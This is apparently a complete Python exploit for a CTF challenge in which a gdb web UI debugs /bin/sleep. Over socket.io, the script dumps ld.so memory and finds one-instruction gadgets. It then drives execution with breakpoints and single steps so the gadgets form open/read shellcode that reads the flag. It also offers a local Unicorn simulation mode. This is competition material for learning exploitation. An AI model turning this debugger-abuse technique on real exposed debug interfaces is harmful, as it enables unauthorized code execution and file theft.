# Axel '0vercl0k' Souchet - December 27 2020
# """
# I set up an old favorite challenge of mine as a Christmas challenge:
# A gdb web UI running /bin/sleep. Can you pwn it?
# """
# https://twitter.com/_tsuro/status/1341445230436999172
# https://github.com/sroettger/play-my-challenge
#
# pip3 install capstone keystone-engine unicorn python-socketio websocket-client
import socketio
import time
import os
import sys
import keystone
import capstone
from unicorn import *
from unicorn.x86_const import *

cs = capstone.Cs(capstone.CS_ARCH_X86, capstone.CS_MODE_64)
ks = keystone.Ks(keystone.KS_ARCH_X86, keystone.KS_MODE_64)

def open_read_payload():
    return (
        # 'a' = 0x61
        'add al, 1',
        'add al, 1',
        'sub rsp, 8',
        'push rsp',
        'add al, 0xf',
        'add al, 0x2f',
        'add al, 8',
        'add al, 0x18',
        'pop rdi',
        'mov cl, 2',
        'add al, 1',
        'add byte ptr [rdi + rcx], al',
        # 'f' = 0x66
        'xor eax, eax',
        'mov cl, 0',
        'add al, 0x66',
        'add byte ptr [rdi + rcx], al',
        # 'g' = 0x67
        'add al, 1',
        'add ecx, 1',
        'add ecx, 1',
        'add ecx, 1',
        'add byte ptr [rdi + rcx], al',
        # 'l' = 0x6c
        'add al, 7',
        'shr cl, 1',
        'sub al, 2',
        'add byte ptr [rdi + rcx], al',
        # open
        'xor eax, eax',
        'add al, 1',
        'add al, 1',
        'syscall',
        # read
        'mov rdi, rax',
        'xor eax, eax',
        'mov rsi, rsp',
        'mov edx, 0x18b',
        'syscall'
    )

def main(simu):
    bp, unbp, step, ni, dump_mem = None, None, None, None, None
    regs = None

    # If we are in simulation, we simulate the environment using unicorn.
    if simu:
        regs = {
            'rax': 0, 'rbx': 0, 'rcx': 0, 'rdx': 0, 'rsi': 0,
            'rdi': 140737488350784, 'rbp': 0, 'rsp': 140737488350784,
            'r8': 0, 'r9': 0, 'r10': 0, 'r11': 0, 'r12': 0, 'r13': 0,
            'r14': 0, 'r15': 0, 'rip': 140737353941251,
            'eflags': 219043332610, 'cs': 43, 'ss': 0, 'ds': 0, 'es': 0, 'fs': 0, 'gs': 0
        }

        addr = 0x7ffff7fd0000
        code_content = open('{:x}.bin'.format(addr), 'rb').read()
        mu = Uc(UC_ARCH_X86, UC_MODE_64)
        mu.mem_map(addr, len(code_content))
        mu.mem_write(addr, code_content)
        mu.mem_map(regs['rsp'] & 0xfffffffffffff000, 0x1000, UC_PROT_READ | UC_PROT_WRITE)
        mu.mem_write(regs['rsp'], b'\x02\x00\x00\x00\x00\x00\x00\x00\xd0\xef\xff\xff\xff\x7f\x00\x00')
        reg_csts = {
            'rax': UC_X86_REG_RAX, 'rbx': UC_X86_REG_RBX,
            'rcx': UC_X86_REG_RCX, 'rdx': UC_X86_REG_RDX,
            'rsi': UC_X86_REG_RSI, 'rdi': UC_X86_REG_RDI,
            'rbp': UC_X86_REG_RBP, 'rsp': UC_X86_REG_RSP,
            'r8': UC_X86_REG_R8, 'r9': UC_X86_REG_R9,
            'r10': UC_X86_REG_R10, 'r11': UC_X86_REG_R11,
            'r12': UC_X86_REG_R12, 'r13': UC_X86_REG_R13,
            'r14': UC_X86_REG_R14, 'r15': UC_X86_REG_R15,
            'rip': UC_X86_REG_RIP, 'eflags': UC_X86_REG_EFLAGS
        }

        # Set the register state in the unicorn context.
        for reg_name, reg_uni in reg_csts.items():
            mu.reg_write(reg_uni, regs[reg_name])

        breakpoint_maps = {}
        def bp_(addr):
            # If we already set a breakpoint here, it's a no-op.
            if addr in breakpoint_maps:
                return

            breakpoint_maps[addr] = bytes(mu.mem_read(addr, 1))
            mu.mem_write(addr, b'\xcc')

        def unbp_(addr):
            # If we don't have a breakpoint here, it's a no-op.
            if addr not in breakpoint_maps:
                return

            mu.mem_write(addr, breakpoint_maps[addr])
            del breakpoint_maps[addr]

        def step_():
            opcodes = mu.mem_read(regs['rip'], 2)
            if opcodes.startswith(b'\xcc'):
                regs['rip'] += 1
            elif opcodes == b'\x0f\x05':
                regs['rip'] += 2
            else:
                mu.emu_start(regs['rip'], 0xffffffffffffffff, count = 1)
                for reg_name, reg_uni in reg_csts.items():
                    regs[reg_name] = mu.reg_read(reg_uni)

        def ni_():
            rip = regs['rip']
            bp(rip)
            step()
            unbp(rip)
            assert rip != regs['rip']

        def dump_mem_(addr, size):
            return bytes(mu.mem_read(addr, size))

        bp, unbp, step, ni, dump_mem = bp_, unbp_, step_, ni_, dump_mem_
    else:
        print('Connecting..')
        sio = socketio.Client(logger = False, engineio_logger = False)
        lastmem_, lastbp_, connected_ = None, None, None

        @sio.on('connect')
        def on_connect():
            nonlocal connected_
            connected_ = True

        @sio.on('connect_error')
        def on_connect_error():
            print('The connection failed!')
            sys.exit(0)

        @sio.on('disconnect')
        def on_disconnect():
            print("I'm disconnected!")
            sys.exit(0)

        @sio.on('mem')
        def on_mem(msg):
            nonlocal lastmem_
            lastmem_ = msg['data']

        @sio.on('breakpoints')
        def on_bps(bps):
            nonlocal lastbp_
            lastbp_ = bps

        @sio.on('regs')
        def on_regs(r):
            nonlocal regs
            regs = r

        def dump_mem_(addr, count):
            nonlocal lastmem_
            sio.call('mem', {'addr': addr, 'count': count})
            while lastmem_ is None: time.sleep(0.2)
            copy = lastmem_
            lastmem_ = None
            return copy

        def bp_(addr):
            sio.call('break', {'addr': addr})
            while addr not in lastbp_: time.sleep(0.1)

        def unbp_(addr):
            sio.call('unbreak', {'addr': addr})
            while addr in lastbp_: time.sleep(0.1)

        def step_():
            rip = regs['rip']
            sio.call('step')
            while regs['rip'] == rip: time.sleep(0.2)

        def ni_():
            rip = regs['rip']
            bp(rip)
            step()
            unbp(rip)

        bp, unbp, step, ni, dump_mem = bp_, unbp_, step_, ni_, dump_mem_
        sio.connect('http://www.pwngdb.kctf.zero-entropy.de/', transports = ['websocket'])
        print(f'Done, sid {sio.sid}')
        while connected_ is None: time.sleep(0.2)
        sio.call('start', timeout = 120)
        while regs is None: time.sleep(0.2)

        # Fill the slots for the hardware breakpoints as those don't result
        # in cc's.
        for i in range(4):
            bp(i)

    # Ensure we defined every methods use by the exploit.
    assert all((bp, unbp, step, ni, dump_mem)), 'a method is not defined'

    rip = regs['rip']
    print('@rip={:x}'.format(rip))
    assert rip == 0x7ffff7fd0103, '@rip assumed to be 0x7ffff7fd0103'
    assert regs['rax'] == 0x0, '@rax assumed to be 0'
    assert regs['rsi'] == 0x0, '@rsi assumed to be 0'
    assert regs['rcx'] == 0x0, '@rcx assumed to be 0'

    # Align to find the base of the region.
    code_region_addr = rip & 0xfffffffffffff000
    assert code_region_addr == 0x7ffff7fd0000, 'wrong region address'
    print('ld-2.31.so @{:x}'.format(code_region_addr))

    # Dump the entire region.
    code_region = dump_mem(code_region_addr, 0x23000)
    print('Got code region ({:#x} bytes): {}'.format(len(code_region), code_region[:20]))
    assert len(code_region) == 0x23000, 'Code region size not right'

    # Build the payload.
    print('Building the payload, the gadget / jmp store..')
    jmpback_dst_offset = 128
    jmpback_dst_addr = code_region_addr + jmpback_dst_offset
    jmpback_offset = 83044
    jmpback_addr = code_region_addr + jmpback_offset
    payload_instrs = open_read_payload()

    # Extract the slice of code we are operating on.
    code_region_slice = code_region[jmpback_dst_offset : jmpback_offset]

    # Loop until we have walked through the slice region.
    gadgets = {}
    jmps = {}
    found_gadgets = set()
    for i in range(len(code_region_slice)):
        base_addr = code_region_addr + jmpback_dst_offset + i
        for addr, _, mnemonic, op_str in cs.disasm_lite(code_region_slice[i : ], base_addr, 1):
            d_instr = '{} {}'.format(mnemonic, op_str).strip()
            if d_instr in payload_instrs:
                # Keep track of what gadget is where at.
                gadgets.setdefault(d_instr, []).append(addr)
                found_gadgets.add(d_instr)
                # print('Found "{}" at {:#x}'.format(d_instr, addr))
            else:
                # We are only interested in `jmp imm`, so ignore the rest.
                if not mnemonic.startswith('jmp') or not op_str.startswith('0x'):
                    break

                # Grab the destination address.
                dst_addr = int(op_str, 16)

                # If the destination address is bigger than the back jmp, then we ignore it.
                if dst_addr > jmpback_addr or dst_addr < code_region_addr:
                    break

                # Keep track of the offset of where this jump is and where it jumps at.
                # print('{:#x}: jumps at {:#x}'.format(addr, dst_addr))
                jmps[addr] = dst_addr

    assert found_gadgets == set(payload_instrs), 'all gadgets not found'
    print('Payload is made of {} instructions'.format(len(payload_instrs)))

    # It's time to pull off the attack.
    t0 = time.time()
    print('Starting the attack..')
    total_ni_number = 0
    for payload_idx, payload_instr in enumerate(payload_instrs):
        # We grab the closest entry.
        payload_instr_addr = None
        for instr_addr in gadgets[payload_instr]:
            if instr_addr < regs['rip']:
                continue

            payload_instr_addr = instr_addr
            break

        assert payload_instr_addr is not None

        ni_number_gadget = 0
        print('- Trying to execute "{}" @{:#x}..'.format(payload_instr, payload_instr_addr))

        # OK so the goal here is to land on the gadget we want to execute.
        # We could single-step all the way but this is unfortunately way too slow.
        # The strategy here is to use a combination of jumps and single-steps to
        # get there as fast as possible (in reality this optimization doesn't get us
        # a whole lot, but oh well).
        # Once we executed the gadget, we have several choices:
        #   - Either, the next instruction is on the way and we should get there,
        #   - Worse case is we need to go all the way down to the jmpback.
        # The payload has been crafted manually to have to traverse the whole code section
        # twice only - which already takes about 6.5hrs.
        target_addr = payload_instr_addr
        state = 'gadget'
        while True:
            print('  - Currently @{:#x} trying to get to @{:#x}'.format(regs['rip'], target_addr))
            assert regs['rip'] <= target_addr, '@rip is expected to be before the target'

            # Let's find out if there is a jump we can take.
            # The simple strategy that we implement here is to find the closest jmp. This
            # is definitely not the smartest, but not sure how much better would be a more
            # approach here, so settle for simple.
            def find_best_jmp():
                jmps_src_addrs = sorted(jmps.keys())
                for jmp_src_addr in jmps_src_addrs:
                    jmp_dst_addr = jmps[jmp_src_addr]
                    # The `jmps_src_addrs` is sorted, so the first entry that is further away than rip,
                    # we take it. We also need to have the destinaton of the jmp not jmp too far ahead.
                    if jmp_src_addr > regs['rip'] and jmp_src_addr < jmp_dst_addr <= target_addr:
                        return jmp_src_addr

            closest_jmp_src_addr = find_best_jmp()

            # If we found a jmp let's step until to get to the jmp.
            if closest_jmp_src_addr is not None:
                closest_jmp_dst_addr = jmps[closest_jmp_src_addr]
                ni_number = closest_jmp_src_addr - regs['rip']
                print('   - Closest forward jmp @{:#x} to @{:#x} ({} ni)'.format(closest_jmp_src_addr, closest_jmp_dst_addr, ni_number))
                while regs['rip'] != closest_jmp_src_addr:
                    ni()
                    ni_number_gadget += 1

                # Take the jmp now.
                step()
                assert regs['rip'] == closest_jmp_dst_addr, 'rip should be @ closest_jmp_dst_addr'

                # We can now go to the next iteration of the algorithm.
                continue

            # If we haven't found a jmp, then we have to single-step until the target address.
            ni_number = target_addr - regs['rip']
            print('   - No forward jmp found, so stepping from @{:#x} to @{:#x} ({} ni)..'.format(regs['rip'], target_addr, ni_number))
            while regs['rip'] != target_addr:
                ni()
                ni_number_gadget += 1

            assert regs['rip'] == target_addr, 'did not hit target'

            # Execute the target address.
            step()

            # If we were in the 'gadget' state, then we now need to get to the jmpback.
            # So we switch state, as well as the `target_addr` to go through the same algorithm.
            if state == 'gadget':
                print('   - Gadget executed, now @{:x}, now checking our options...'.format(regs['rip']))
                if (payload_idx + 1) == len(payload_instrs):
                    print('   - It was the latest gadget, so we are done')
                    break

                # Let's check out if there is an instance of the next gadget on the way..
                next_payload_instr_ontheway = False
                next_payload_instr = payload_instrs[payload_idx + 1]
                for next_gadget_addr in gadgets[next_payload_instr]:
                    if next_gadget_addr >= regs['rip']:
                        print('   - The next gadget {} is @{:#x}, so lets try to get there from @{:#x}..'.format(
                            next_payload_instr, next_gadget_addr, regs['rip']
                        ))
                        next_payload_instr_ontheway = True
                        target_addr = next_gadget_addr
                        break

                # If we found a gadget available on the way, let's go.
                if next_payload_instr_ontheway:
                    break

                target_addr = jmpback_addr
                print('   - Looking to reach jmpback @{:#x} '.format(target_addr))
                state = 'jmpback'
            # If we were in the 'jmpback' state, then it means we have executed the gadget, found
            # the jmpback and took it, so we can break out.
            elif state == 'jmpback':
                print('   - Executed the jmpback!')
                break
            else:
                raise RuntimeError()

        worst_ni_number = jmpback_addr - jmpback_dst_addr
        print(f' - Executed "{payload_instr}" with {ni_number_gadget} ni (vs ~worst {worst_ni_number}).')
        total_ni_number += ni_number_gadget

    t1 = time.time()
    print('Done in {}s, executed {} instrs with {} ni.'.format(t1 - t0, len(payload_instrs), total_ni_number))
    print('Flag: {}'.format(dump_mem(regs['rsp'], 0x100)))

if __name__ == '__main__':
    simulation = True
    if len(sys.argv) > 1:
        simulation = sys.argv[1] == 'local'

    main(simulation)
